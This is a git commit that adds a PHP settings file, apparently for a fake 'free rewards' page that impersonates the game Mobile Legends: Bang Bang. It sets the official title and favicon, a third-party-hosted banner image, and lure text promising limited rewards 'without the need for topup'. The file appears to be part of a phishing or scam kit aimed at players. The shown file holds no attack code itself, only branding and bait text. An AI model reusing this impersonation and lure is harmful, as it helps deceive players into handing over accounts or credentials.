5afcd15a0d54af8a6325c89d674631171ee09177
Sarkembel <sarkembel2987@gmail.com>
2023-06-24 11:31:03 +0700

    freegivemlbb

---
+++ system/setting.php
@@ -0,0 +1,8 @@
+<?php
+$title = 'Mobile Legends: Bang Bang';
+$description = 'Collect your special rewards at the MOBILE LEGENDS event. This opportunity is limited and without the need for topup. Collect your rewards now!';
+$copyright = 'MOBILE LEGENDS';
+$theme = '#000';
+$image = 'https://cdn.jsdelivr.net/gh/arpantek/logArpan@main/mlbb-5v5.webp';
+$icon = 'https://m.mobilelegends.com/static/images/favicon.ico';
+?>
